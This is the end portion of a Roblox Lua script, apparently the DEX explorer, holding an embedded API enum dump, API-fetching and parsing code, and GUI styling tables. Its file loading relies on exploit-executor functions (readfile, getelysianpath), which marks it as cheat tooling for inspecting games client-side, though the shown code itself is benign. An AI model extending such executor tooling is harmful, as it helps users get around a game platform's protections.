],"Value":3,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level04","tags":[],"Value":4,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level05","tags":[],"Value":5,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level06","tags":[],"Value":6,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level07","tags":[],"Value":7,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level08","tags":[],"Value":8,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level09","tags":[],"Value":9,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level10","tags":[],"Value":10,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level11","tags":[],"Value":11,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level12","tags":[],"Value":12,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level13","tags":[],"Value":13,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level14","tags":[],"Value":14,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level15","tags":[],"Value":15,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level16","tags":[],"Value":16,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level17","tags":[],"Value":17,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level18","tags":[],"Value":18,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level19","tags":[],"Value":19,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level20","tags":[],"Value":20,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level21","tags":[],"Value":21,"Enum":"QualityLevel"},{"type":"Enum","Name":"RenderPriority","tags":[]},{"type":"EnumItem","Name":"First","tags":[],"Value":0,"Enum":"RenderPriority"},{"type":"EnumItem","Name":"Input","tags":[],"Value":100,"Enum":"RenderPriority"},{"type":"EnumItem","Name":"Camera","tags":[],"Value":200,"Enum":"RenderPriority"},{"type":"EnumItem","Name":"Character","tags":[],"Value":300,"Enum":"RenderPriority"},{"type":"EnumItem","Name":"Last","tags":[],"Value":2000,"Enum":"RenderPriority"},{"type":"Enum","Name":"Resolution","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"Resolution"},{"type":"EnumItem","Name":"720x526","tags":[],"Value":1,"Enum":"Resolution"},{"type":"EnumItem","Name":"800x600","tags":[],"Value":2,"Enum":"Resolution"},{"type":"EnumItem","Name":"1024x600","tags":[],"Value":3,"Enum":"Resolution"},{"type":"EnumItem","Name":"1024x768","tags":[],"Value":4,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x720","tags":[],"Value":5,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x768","tags":[],"Value":6,"Enum":"Resolution"},{"type":"EnumItem","Name":"1152x864","tags":[],"Value":7,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x800","tags":[],"Value":8,"Enum":"Resolution"},{"type":"EnumItem","Name":"1360x768","tags":[],"Value":9,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x960","tags":[],"Value":10,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x1024","tags":[],"Value":11,"Enum":"Resolution"},{"type":"EnumItem","Name":"1440x900","tags":[],"Value":12,"Enum":"Resolution"},{"type":"EnumItem","Name":"1600x900","tags":[],"Value":13,"Enum":"Resolution"},{"type":"EnumItem","Name":"1600x1024","tags":[],"Value":14,"Enum":"Resolution"},{"type":"EnumItem","Name":"1600x1200","tags":[],"Value":15,"Enum":"Resolution"},{"type":"EnumItem","Name":"1680x1050","tags":[],"Value":16,"Enum":"Resolution"},{"type":"EnumItem","Name":"1920x1080","tags":[],"Value":17,"Enum":"Resolution"},{"type":"EnumItem","Name":"1920x1200","tags":[],"Value":18,"Enum":"Resolution"},{"type":"Enum","Name":"ReverbType","tags":[]},{"type":"EnumItem","Name":"NoReverb","tags":[],"Value":0,"Enum":"ReverbType"},{"type":"EnumItem","Name":"GenericReverb","tags":[],"Value":1,"Enum":"ReverbType"},{"type":"EnumItem","Name":"PaddedCell","tags":[],"Value":2,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Room","tags":[],"Value":3,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Bathroom","tags":[],"Value":4,"Enum":"ReverbType"},{"type":"EnumItem","Name":"LivingRoom","tags":[],"Value":5,"Enum":"ReverbType"},{"type":"EnumItem","Name":"StoneRoom","tags":[],"Value":6,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Auditorium","tags":[],"Value":7,"Enum":"ReverbType"},{"type":"EnumItem","Name":"ConcertHall","tags":[],"Value":8,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Cave","tags":[],"Value":9,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Arena","tags":[],"Value":10,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Hangar","tags":[],"Value":11,"Enum":"ReverbType"},{"type":"EnumItem","Name":"CarpettedHallway","tags":[],"Value":12,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Hallway","tags":[],"Value":13,"Enum":"ReverbType"},{"type":"EnumItem","Name":"StoneCorridor","tags":[],"Value":14,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Alley","tags":[],"Value":15,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Forest","tags":[],"Value":16,"Enum":"ReverbType"},{"type":"EnumItem","Name":"City","tags":[],"Value":17,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Mountains","tags":[],"Value":18,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Quarry","tags":[],"Value":19,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Plain","tags":[],"Value":20,"Enum":"ReverbType"},{"type":"EnumItem","Name":"ParkingLot","tags":[],"Value":21,"Enum":"ReverbType"},{"type":"EnumItem","Name":"SewerPipe","tags":[],"Value":22,"Enum":"ReverbType"},{"type":"EnumItem","Name":"UnderWater","tags":[],"Value":23,"Enum":"ReverbType"},{"type":"Enum","Name":"RollOffMode","tags":[]},{"type":"EnumItem","Name":"Inverse","tags":[],"Value":0,"Enum":"RollOffMode"},{"type":"EnumItem","Name":"Linear","tags":[],"Value":1,"Enum":"RollOffMode"},{"type":"Enum","Name":"RotationType","tags":[]},{"type":"EnumItem","Name":"MovementRelative","tags":[],"Value":0,"Enum":"RotationType"},{"type":"EnumItem","Name":"CameraRelative","tags":[],"Value":1,"Enum":"RotationType"},{"type":"Enum","Name":"RuntimeUndoBehavior","tags":[]},{"type":"EnumItem","Name":"Aggregate","tags":[],"Value":0,"Enum":"RuntimeUndoBehavior"},{"type":"EnumItem","Name":"Snapshot","tags":[],"Value":1,"Enum":"RuntimeUndoBehavior"},{"type":"EnumItem","Name":"Hybrid","tags":[],"Value":2,"Enum":"RuntimeUndoBehavior"},{"type":"Enum","Name":"SaveFilter","tags":[]},{"type":"EnumItem","Name":"SaveAll","tags":[],"Value":2,"Enum":"SaveFilter"},{"type":"EnumItem","Name":"SaveWorld","tags":[],"Value":0,"Enum":"SaveFilter"},{"type":"EnumItem","Name":"SaveGame","tags":[],"Value":1,"Enum":"SaveFilter"},{"type":"Enum","Name":"SavedQualitySetting","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel1","tags":[],"Value":1,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel2","tags":[],"Value":2,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel3","tags":[],"Value":3,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel4","tags":[],"Value":4,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel5","tags":[],"Value":5,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel6","tags":[],"Value":6,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel7","tags":[],"Value":7,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel8","tags":[],"Value":8,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel9","tags":[],"Value":9,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel10","tags":[],"Value":10,"Enum":"SavedQualitySetting"},{"type":"Enum","Name":"ScaleType","tags":[]},{"type":"EnumItem","Name":"Stretch","tags":[],"Value":0,"Enum":"ScaleType"},{"type":"EnumItem","Name":"Slice","tags":[],"Value":1,"Enum":"ScaleType"},{"type":"Enum","Name":"SizeConstraint","tags":[]},{"type":"EnumItem","Name":"RelativeXY","tags":[],"Value":0,"Enum":"SizeConstraint"},{"type":"EnumItem","Name":"RelativeXX","tags":[],"Value":1,"Enum":"SizeConstraint"},{"type":"EnumItem","Name":"RelativeYY","tags":[],"Value":2,"Enum":"SizeConstraint"},{"type":"Enum","Name":"SleepAdjustMethod","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"SleepAdjustMethod"},{"type":"EnumItem","Name":"LastSample","tags":[],"Value":1,"Enum":"SleepAdjustMethod"},{"type":"EnumItem","Name":"AverageInterval","tags":[],"Value":2,"Enum":"SleepAdjustMethod"},{"type":"Enum","Name":"SoundType","tags":[]},{"type":"EnumItem","Name":"NoSound","tags":[],"Value":0,"Enum":"SoundType"},{"type":"EnumItem","Name":"Boing","tags":[],"Value":1,"Enum":"SoundType"},{"type":"EnumItem","Name":"Bomb","tags":[],"Value":2,"Enum":"SoundType"},{"type":"EnumItem","Name":"Break","tags":[],"Value":3,"Enum":"SoundType"},{"type":"EnumItem","Name":"Click","tags":[],"Value":4,"Enum":"SoundType"},{"type":"EnumItem","Name":"Clock","tags":[],"Value":5,"Enum":"SoundType"},{"type":"EnumItem","Name":"Slingshot","tags":[],"Value":6,"Enum":"SoundType"},{"type":"EnumItem","Name":"Page","tags":[],"Value":7,"Enum":"SoundType"},{"type":"EnumItem","Name":"Ping","tags":[],"Value":8,"Enum":"SoundType"},{"type":"EnumItem","Name":"Snap","tags":[],"Value":9,"Enum":"SoundType"},{"type":"EnumItem","Name":"Splat","tags":[],"Value":10,"Enum":"SoundType"},{"type":"EnumItem","Name":"Step","tags":[],"Value":11,"Enum":"SoundType"},{"type":"EnumItem","Name":"StepOn","tags":[],"Value":12,"Enum":"SoundType"},{"type":"EnumItem","Name":"Swoosh","tags":[],"Value":13,"Enum":"SoundType"},{"type":"EnumItem","Name":"Victory","tags":[],"Value":14,"Enum":"SoundType"},{"type":"Enum","Name":"SpecialKey","tags":[]},{"type":"EnumItem","Name":"Insert","tags":[],"Value":0,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"Home","tags":[],"Value":1,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"End","tags":[],"Value":2,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"PageUp","tags":[],"Value":3,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"PageDown","tags":[],"Value":4,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"ChatHotkey","tags":[],"Value":5,"Enum":"SpecialKey"},{"type":"Enum","Name":"Status","tags":[]},{"type":"EnumItem","Name":"Poison","tags":["deprecated"],"Value":0,"Enum":"Status"},{"type":"EnumItem","Name":"Confusion","tags":["deprecated"],"Value":1,"Enum":"Status"},{"type":"Enum","Name":"Stuff","tags":[]},{"type":"EnumItem","Name":"Heads","tags":[],"Value":0,"Enum":"Stuff"},{"type":"EnumItem","Name":"Faces","tags":[],"Value":1,"Enum":"Stuff"},{"type":"EnumItem","Name":"Hats","tags":[],"Value":2,"Enum":"Stuff"},{"type":"EnumItem","Name":"TShirts","tags":[],"Value":3,"Enum":"Stuff"},{"type":"EnumItem","Name":"Shirts","tags":[],"Value":4,"Enum":"Stuff"},{"type":"EnumItem","Name":"Pants","tags":[],"Value":5,"Enum":"Stuff"},{"type":"EnumItem","Name":"Gears","tags":[],"Value":6,"Enum":"Stuff"},{"type":"EnumItem","Name":"Torsos","tags":[],"Value":7,"Enum":"Stuff"},{"type":"EnumItem","Name":"LeftArms","tags":[],"Value":8,"Enum":"Stuff"},{"type":"EnumItem","Name":"RightArms","tags":[],"Value":9,"Enum":"Stuff"},{"type":"EnumItem","Name":"LeftLegs","tags":[],"Value":10,"Enum":"Stuff"},{"type":"EnumItem","Name":"RightLegs","tags":[],"Value":11,"Enum":"Stuff"},{"type":"EnumItem","Name":"Bodies","tags":[],"Value":12,"Enum":"Stuff"},{"type":"EnumItem","Name":"Costumes","tags":[],"Value":13,"Enum":"Stuff"},{"type":"Enum","Name":"Style","tags":[]},{"type":"EnumItem","Name":"AlternatingSupports","tags":[],"Value":0,"Enum":"Style"},{"type":"EnumItem","Name":"BridgeStyleSupports","tags":[],"Value":1,"Enum":"Style"},{"type":"EnumItem","Name":"NoSupports","tags":[],"Value":2,"Enum":"Style"},{"type":"Enum","Name":"SurfaceConstraint","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"SurfaceConstraint"},{"type":"EnumItem","Name":"Hinge","tags":[],"Value":1,"Enum":"SurfaceConstraint"},{"type":"EnumItem","Name":"SteppingMotor","tags":[],"Value":2,"Enum":"SurfaceConstraint"},{"type":"EnumItem","Name":"Motor","tags":[],"Value":3,"Enum":"SurfaceConstraint"},{"type":"Enum","Name":"SurfaceType","tags":[]},{"type":"EnumItem","Name":"Smooth","tags":[],"Value":0,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Glue","tags":[],"Value":1,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Weld","tags":[],"Value":2,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Studs","tags":[],"Value":3,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Inlet","tags":[],"Value":4,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Universal","tags":[],"Value":5,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Hinge","tags":[],"Value":6,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Motor","tags":[],"Value":7,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"SteppingMotor","tags":[],"Value":8,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Unjoinable","tags":[],"Value":9,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"SmoothNoOutlines","tags":[],"Value":10,"Enum":"SurfaceType"},{"type":"Enum","Name":"SwipeDirection","tags":[]},{"type":"EnumItem","Name":"Right","tags":[],"Value":0,"Enum":"SwipeDirection"},{"type":"EnumItem","Name":"Left","tags":[],"Value":1,"Enum":"SwipeDirection"},{"type":"EnumItem","Name":"Up","tags":[],"Value":2,"Enum":"SwipeDirection"},{"type":"EnumItem","Name":"Down","tags":[],"Value":3,"Enum":"SwipeDirection"},{"type":"EnumItem","Name":"None","tags":[],"Value":4,"Enum":"SwipeDirection"},{"type":"Enum","Name":"TeleportState","tags":[]},{"type":"EnumItem","Name":"RequestedFromServer","tags":[],"Value":0,"Enum":"TeleportState"},{"type":"EnumItem","Name":"Started","tags":[],"Value":1,"Enum":"TeleportState"},{"type":"EnumItem","Name":"WaitingForServer","tags":[],"Value":2,"Enum":"TeleportState"},{"type":"EnumItem","Name":"Failed","tags":[],"Value":3,"Enum":"TeleportState"},{"type":"EnumItem","Name":"InProgress","tags":[],"Value":4,"Enum":"TeleportState"},{"type":"Enum","Name":"TeleportType","tags":[]},{"type":"EnumItem","Name":"ToPlace","tags":[],"Value":0,"Enum":"TeleportType"},{"type":"EnumItem","Name":"ToInstance","tags":[],"Value":1,"Enum":"TeleportType"},{"type":"EnumItem","Name":"ToReservedServer","tags":[],"Value":2,"Enum":"TeleportType"},{"type":"Enum","Name":"TextXAlignment","tags":[]},{"type":"EnumItem","Name":"Left","tags":[],"Value":0,"Enum":"TextXAlignment"},{"type":"EnumItem","Name":"Center","tags":[],"Value":2,"Enum":"TextXAlignment"},{"type":"EnumItem","Name":"Right","tags":[],"Value":1,"Enum":"TextXAlignment"},{"type":"Enum","Name":"TextYAlignment","tags":[]},{"type":"EnumItem","Name":"Top","tags":[],"Value":0,"Enum":"TextYAlignment"},{"type":"EnumItem","Name":"Center","tags":[],"Value":1,"Enum":"TextYAlignment"},{"type":"EnumItem","Name":"Bottom","tags":[],"Value":2,"Enum":"TextYAlignment"},{"type":"Enum","Name":"ThreadPoolConfig","tags":[]},{"type":"EnumItem","Name":"Auto","tags":[],"Value":0,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"PerCore1","tags":[],"Value":101,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"PerCore2","tags":[],"Value":102,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"PerCore3","tags":[],"Value":103,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"PerCore4","tags":[],"Value":104,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads1","tags":[],"Value":1,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads2","tags":[],"Value":2,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads3","tags":[],"Value":3,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads4","tags":[],"Value":4,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads8","tags":[],"Value":8,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads16","tags":[],"Value":16,"Enum":"ThreadPoolConfig"},{"type":"Enum","Name":"ThrottlingPriority","tags":[]},{"type":"EnumItem","Name":"Extreme","tags":[],"Value":2,"Enum":"ThrottlingPriority"},{"type":"EnumItem","Name":"ElevatedOnServer","tags":[],"Value":1,"Enum":"ThrottlingPriority"},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"ThrottlingPriority"},{"type":"Enum","Name":"TickCountSampleMethod","tags":[]},{"type":"EnumItem","Name":"Fast","tags":[],"Value":0,"Enum":"TickCountSampleMethod"},{"type":"EnumItem","Name":"Benchmark","tags":[],"Value":1,"Enum":"TickCountSampleMethod"},{"type":"EnumItem","Name":"Precise","tags":[],"Value":2,"Enum":"TickCountSampleMethod"},{"type":"Enum","Name":"TopBottom","tags":[]},{"type":"EnumItem","Name":"Top","tags":[],"Value":0,"Enum":"TopBottom"},{"type":"EnumItem","Name":"Center","tags":[],"Value":1,"Enum":"TopBottom"},{"type":"EnumItem","Name":"Bottom","tags":[],"Value":2,"Enum":"TopBottom"},{"type":"Enum","Name":"TouchCameraMovementMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"TouchCameraMovementMode"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":2,"Enum":"TouchCameraMovementMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":1,"Enum":"TouchCameraMovementMode"},{"type":"Enum","Name":"TouchMovementMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"TouchMovementMode"},{"type":"EnumItem","Name":"Thumbstick","tags":[],"Value":1,"Enum":"TouchMovementMode"},{"type":"EnumItem","Name":"DPad","tags":[],"Value":2,"Enum":"TouchMovementMode"},{"type":"EnumItem","Name":"Thumbpad","tags":[],"Value":3,"Enum":"TouchMovementMode"},{"type":"EnumItem","Name":"ClickToMove","tags":[],"Value":4,"Enum":"TouchMovementMode"},{"type":"Enum","Name":"TweenStatus","tags":[]},{"type":"EnumItem","Name":"Canceled","tags":[],"Value":0,"Enum":"TweenStatus"},{"type":"EnumItem","Name":"Completed","tags":[],"Value":1,"Enum":"TweenStatus"},{"type":"Enum","Name":"UiMessageType","tags":[]},{"type":"EnumItem","Name":"UiMessageError","tags":[],"Value":0,"Enum":"UiMessageType"},{"type":"EnumItem","Name":"UiMessageInfo","tags":[],"Value":1,"Enum":"UiMessageType"},{"type":"Enum","Name":"UploadSetting","tags":[]},{"type":"EnumItem","Name":"Never","tags":[],"Value":0,"Enum":"UploadSetting"},{"type":"EnumItem","Name":"Ask","tags":[],"Value":1,"Enum":"UploadSetting"},{"type":"EnumItem","Name":"Always","tags":[],"Value":2,"Enum":"UploadSetting"},{"type":"Enum","Name":"UserCFrame","tags":[]},{"type":"EnumItem","Name":"Head","tags":[],"Value":0,"Enum":"UserCFrame"},{"type":"EnumItem","Name":"LeftHand","tags":[],"Value":1,"Enum":"UserCFrame"},{"type":"EnumItem","Name":"RightHand","tags":[],"Value":2,"Enum":"UserCFrame"},{"type":"Enum","Name":"UserInputState","tags":[]},{"type":"EnumItem","Name":"Begin","tags":[],"Value":0,"Enum":"UserInputState"},{"type":"EnumItem","Name":"Change","tags":[],"Value":1,"Enum":"UserInputState"},{"type":"EnumItem","Name":"End","tags":[],"Value":2,"Enum":"UserInputState"},{"type":"EnumItem","Name":"Cancel","tags":[],"Value":3,"Enum":"UserInputState"},{"type":"EnumItem","Name":"None","tags":[],"Value":4,"Enum":"UserInputState"},{"type":"Enum","Name":"UserInputType","tags":[]},{"type":"EnumItem","Name":"MouseButton1","tags":[],"Value":0,"Enum":"UserInputType"},{"type":"EnumItem","Name":"MouseButton2","tags":[],"Value":1,"Enum":"UserInputType"},{"type":"EnumItem","Name":"MouseButton3","tags":[],"Value":2,"Enum":"UserInputType"},{"type":"EnumItem","Name":"MouseWheel","tags":[],"Value":3,"Enum":"UserInputType"},{"type":"EnumItem","Name":"MouseMovement","tags":[],"Value":4,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Touch","tags":[],"Value":7,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Keyboard","tags":[],"Value":8,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Focus","tags":[],"Value":9,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Accelerometer","tags":[],"Value":10,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gyro","tags":[],"Value":11,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad1","tags":[],"Value":12,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad2","tags":[],"Value":13,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad3","tags":[],"Value":14,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad4","tags":[],"Value":15,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad5","tags":[],"Value":16,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad6","tags":[],"Value":17,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad7","tags":[],"Value":18,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad8","tags":[],"Value":19,"Enum":"UserInputType"},{"type":"EnumItem","Name":"TextInput","tags":[],"Value":20,"Enum":"UserInputType"},{"type":"EnumItem","Name":"None","tags":[],"Value":21,"Enum":"UserInputType"},{"type":"Enum","Name":"VibrationMotor","tags":[]},{"type":"EnumItem","Name":"Large","tags":[],"Value":0,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"Small","tags":[],"Value":1,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"LeftTrigger","tags":[],"Value":2,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"RightTrigger","tags":[],"Value":3,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"LeftHand","tags":[],"Value":4,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"RightHand","tags":[],"Value":5,"Enum":"VibrationMotor"},{"type":"Enum","Name":"VideoQualitySettings","tags":[]},{"type":"EnumItem","Name":"LowResolution","tags":[],"Value":0,"Enum":"VideoQualitySettings"},{"type":"EnumItem","Name":"MediumResolution","tags":[],"Value":1,"Enum":"VideoQualitySettings"},{"type":"EnumItem","Name":"HighResolution","tags":[],"Value":2,"Enum":"VideoQualitySettings"},{"type":"Enum","Name":"WaterDirection","tags":[]},{"type":"EnumItem","Name":"NegX","tags":[],"Value":0,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"X","tags":[],"Value":1,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"NegY","tags":[],"Value":2,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"Y","tags":[],"Value":3,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"NegZ","tags":[],"Value":4,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"Z","tags":[],"Value":5,"Enum":"WaterDirection"},{"type":"Enum","Name":"WaterForce","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"WaterForce"},{"type":"EnumItem","Name":"Small","tags":[],"Value":1,"Enum":"WaterForce"},{"type":"EnumItem","Name":"Medium","tags":[],"Value":2,"Enum":"WaterForce"},{"type":"EnumItem","Name":"Strong","tags":[],"Value":3,"Enum":"WaterForce"},{"type":"EnumItem","Name":"Max","tags":[],"Value":4,"Enum":"WaterForce"}]
]===]
	return rawApiJson
end

function getCurrentApiJson()
	local jsonStr = nil
	if readfile and getelysianpath then
		if readfile(getelysianpath().."Xpl0rerApi.txt") then
			print("Api found in folder!")
			jsonStr = readfile(getelysianpath().."Xpl0rerApi.txt")
			return jsonStr
		end
	end
	local success, err = pcall(function()
		jsonStr = httpGet(apiUrl)
		print("Fetched json successfully")
	end)
	if success then
		print("Returning json")
		--print(jsonStr:sub(1,500))
		return jsonStr
	else
		print("Error fetching json: " .. tostring(err))
		print("Falling back to local copy")
		return getLocalApiJson()
	end
end

function splitStringIntoChunks(jsonStr)
	-- Splits up a string into a table with a given size
	local t = {}
	for i = 1, math.ceil(string.len(jsonStr)/maxChunkSize) do
		local str = jsonStr:sub((i-1)*maxChunkSize+1, i*maxChunkSize)
		table.insert(t, str)
	end
	return t
end

local jsonToParse = getCurrentApiJson()
local apiChunks = splitStringIntoChunks(jsonToParse)

function getRbxApi()
--[[
	Api.Classes
	Api.Enums
	Api.GetProperties(className)
	Api.IsEnum(valueType)
--]]

-- Services
local HttpService = game:GetService("HttpService")
local ServerStorage = game:GetService("ServerStorage")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Remotes
--local Remotes = ReplicatedStorage:WaitForChild("OnlineStudio"):WaitForChild("Remotes")
--local GetApiJsonFunction = Remotes:WaitForChild("GetApiJson")

-- Functions
local JsonDecode = function(s) return HttpService:JSONDecode(s) end

local function GetApiRemoteFunction(index)
	if (apiChunks[index]) then 
		return apiChunks[index], #apiChunks
	else
		print("Bad index for GetApiJson")
		return nil
	end
end

local function getApiJson()
	local apiTable = {}
	local firstPage, pageCount = GetApiRemoteFunction(1)
	table.insert(apiTable, firstPage)
	for i = 2, pageCount do
		--print("Fetching API page # " .. tostring(i))
		local result = GetApiRemoteFunction(i)
		table.insert(apiTable, result)
	end
	return table.concat(apiTable)
end

local json = getApiJson()
local apiDump =  JsonDecode(json)

local Classes = {}
local Enums = {}

local function sortAlphabetic(t, property)
	table.sort(t, 
		function(x,y) return x[property] < y[property]
	end)
end

local function isEnum(name)
	return Enums[name] ~= nil
end

local function getProperties(className)
	local class = Classes[className]
	local properties = {}
	
	if not class then return properties end
	
	while class do
		for _,property in pairs(class.Properties) do
			table.insert(properties, property)
		end
		class = Classes[class.Superclass]
	end
	
	sortAlphabetic(properties, "Name")

	return properties
end

for _,item in pairs(apiDump) do
	local itemType = item.type
-- Classes --
	if (itemType == 'Class') then
		Classes[item.Name] = item
		item.Properties = {}
		item.Functions = {}
		item.YieldFunctions = {}
		item.Events = {}
		item.Callbacks = {}
-- Members --
	elseif (itemType == 'Property') then
		table.insert(Classes[item.Class].Properties, item)
	elseif (itemType == 'Function') then
		table.insert(Classes[item.Class].Functions, item)
	elseif (itemType == 'YieldFunction') then
		table.insert(Classes[item.Class].YieldFunctions, item)
	elseif (itemType == 'Event') then
		table.insert(Classes[item.Class].Events, item)
	elseif (itemType == 'Callback') then
		table.insert(Classes[item.Class].Callbacks, item)
-- Enums --
	elseif (itemType == 'Enum') then
		Enums[item.Name] = item
		item.EnumItems = {}
	elseif (itemType == 'EnumItem') then
		Enums[item.Enum].EnumItems[item.Name] = item
	end
end

return {
	Classes = Classes;
	Enums = Enums;
	GetProperties = getProperties;
	IsEnum = isEnum;
}
end

-- Modules
local Permissions = {CanEdit = true}
local RbxApi = getRbxApi()

--[[
	RbxApi.Classes
	RbxApi.Enums
	RbxApi.GetProperties(className)
	RbxApi.IsEnum(valueType)
--]]

-- Styles

local function CreateColor3(r, g, b) return Color3.new(r/255,g/255,b/255) end

local Styles = {
	Font = Enum.Font.Arial;
	Margin = 5;
	Black = CreateColor3(0,0,0);
	White = CreateColor3(255,255,255);
}

local Row = {
	Font = Styles.Font;
	FontSize = Enum.FontSize.Size14;
	TextXAlignment = Enum.TextXAlignment.Left;
	TextColor = Styles.Black;
	TextColorOver = Styles.White;
	TextLockedColor = CreateColor3(120,120,120);
	Height = 24;
	BorderColor = CreateColor3(216,216,216);
	BackgroundColor = Styles.White;
	BackgroundColorAlternate = CreateColor3(246,246,246);
	BackgroundColorMouseover = CreateColor3(211,224,244);
	TitleMarginLeft = 15;
}

local DropDown = {
	Font = Styles.Font;
	FontSize = Enum.FontSize.Size14;
	TextColor = CreateColor3(0,0,0);
	TextColorOver = Styles.White;
	TextXAlignment = Enum.TextXAlignment.Left;
	Height = 16;
	BackColor = Styles.White;
	BackColorOver = CreateColor3(86,125,188);
	BorderColor = CreateColor3(216,216,216);
	BorderSizePixel = 2;
	ArrowColor = CreateColor3(160,160,160);
	ArrowColorOver = Styles.Black;
}

local BrickColors = {
	BoxSize = 13;
	BorderSizePixel = 1;
	BorderColor = CreateColor3(160,160,160);
	FrameColor = CreateColor3(160,160,160);
	Size = 20;
	Padding = 4;
	ColorsPerRow = 8;
	OuterBorder = 1;
	OuterBorderColor = Styles.Black;
}

wait(1)

local Gui = D_E_X
local PropertiesFrame = Gui:WaitForChild("PropertiesFrame")
local ExplorerFrame = Gui:WaitForChild("ExplorerPanel")

